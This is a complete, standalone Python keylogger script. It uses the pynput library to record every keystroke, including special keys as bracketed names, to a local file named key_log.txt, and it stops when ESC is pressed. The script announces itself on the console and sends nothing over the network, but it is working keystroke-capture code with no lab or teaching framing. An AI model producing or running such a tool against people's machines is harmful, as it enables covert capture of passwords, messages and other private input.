from pynput import keyboard

LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            if hasattr(key, 'char') and key.char is not None:
                log.write(key.char)
            else:
                log.write(f'[{key.name}]')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop listener when Esc is pressed
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping keylogger.")
        return False  # Returning False stops the listener

def main():
    print("Keylogger started (Press ESC to stop)...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
